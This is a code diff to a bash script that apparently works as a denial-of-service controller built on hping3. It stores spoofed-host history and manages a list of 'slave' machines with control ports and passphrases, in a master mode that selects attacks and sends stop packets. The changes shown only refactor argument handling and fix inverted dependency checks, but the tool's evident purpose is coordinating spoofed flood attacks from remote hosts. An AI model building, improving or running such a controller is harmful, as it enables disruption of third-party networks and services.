@@ -1,5 +1,9 @@
 #!/bin/bash
-if [ `echo $1 | tr [:upper:] [:lower:]` = "install" ]; then
+lower_args=`echo $1 | tr [:upper:] [:lower:]`
+if [ ! ${lower_args} ]; then
+    lower_args=noargs
+fi
+if [ ${lower_args} = "install" ]; then
     if [ ! -d ~/.dos_history/ ]; then
         mkdir ~/.dos_history/
         echo "Couldn't find ${HOME}/.dos_history, attempting to create it."
@@ -7,7 +11,7 @@ if [ `echo $1 | tr [:upper:] [:lower:]` = "install" ]; then
         echo "Found ${HOME}/.dos_history"
     fi
     DIALOG_VER=`whereis dialog | awk '{printf $2}'`
-    if [ ! "${DIALOG_VER}" ]; then
+    if [ "${DIALOG_VER}" ]; then
         echo "Found dialog"
     else
         echo "dialog does not appear to be installed."
@@ -24,7 +28,7 @@ Last_Spoof_Host: example.com" > ~/.dos_history/.last_dos
         echo "Found ${HOME}/.dos_history/.last_dos"
     fi
     HPING3_TEST=`whereis hping3 | awk '{printf $2}'`
-    if [ ! "${HPING3_TEST}" ]; then
+    if [ "${HPING3_TEST}" ]; then
         echo "Found hping3"
     else
         echo "hping3 does not appear to be installed."
@@ -36,7 +40,7 @@ Last_Spoof_Host: example.com" > ~/.dos_history/.last_dos
     if [ `${ANSWER} | tr [:upper:] [:lower:]` = "n" ]; then
         exit 0
     fi
-elif [ `echo $1 | tr [:upper:] [:lower:]` = "remove" ]; then
+elif [ ${lower_args} = "remove" ]; then
     if [ -d ~/.dos_history/ ]; then
         echo "Found ~/.dos_history/, removing."
         rm -rf ~/.dos_history/
@@ -124,10 +128,10 @@ function master {
     done < .ip_list
     }
 #No GUI, derive parameters from the history.
-if [ `echo $1 | tr [:upper:] [:lower:]` = "unattended" ]; then
+if [ ${lower_args} = "unattended" ]; then
     func_history
     exit 0
-elif [ `echo $1 | tr [:upper:] [:lower:]` = "history" ]; then
+elif [ ${lower_args} = "history" ]; then
     if [ -e $2 ]; then
         dos_history $2
         func_history
@@ -147,7 +151,7 @@ elif [ `echo $1 | tr [:upper:] [:lower:]` = "history" ]; then
         done
     fi
 #7:58PM 13/01/2012
-elif [ `echo $1 | tr [:upper:] [:lower:]` = "master" ]; then
+elif [ ${lower_args} = "master" ]; then
     echo "Add IPs to ~/.dos_history/.ip_list where the IP is first on the line and port is second."
     echo "Select the attack to perform:"
     cd ~/.dos_history
@@ -163,7 +167,7 @@ elif [ `echo $1 | tr [:upper:] [:lower:]` = "master" ]; then
     #fi
     exit 0
     done
-elif [ `echo $1 | tr [:upper:] [:lower:]` = "stop" ]; then
+elif [ ${lower_args} = "stop" ]; then
     echo "Make sure a third field is in ~/.dos_history/.ip_list and a daemon running on the machine."
     cd ~/.dos_history
     while read p; do
@@ -174,7 +178,7 @@ elif [ `echo $1 | tr [:upper:] [:lower:]` = "stop" ]; then
     echo "Sent stop packet to ${SLAVE_INFO[1]} on port ${SLAVE_INFO[2]}"
     done < .ip_list
     exit 0
-elif [ `echo $1 | tr [:upper:] [:lower:]` = "add" ]; then
+elif [ ${lower_args} = "add" ]; then
     SLAVE_INFO[1]=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Slave IP" 8 40 --stdout`
     SLAVE_INFO[2]=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Control Daemon Port" 8 40 100 --stdout`
     SLAVE_INFO[3]=`dialog --title "${BACKTITLE}" --backtitle "${BACKTITLE}" --inputbox "Slave Passphrase" 8 40 default --stdout`
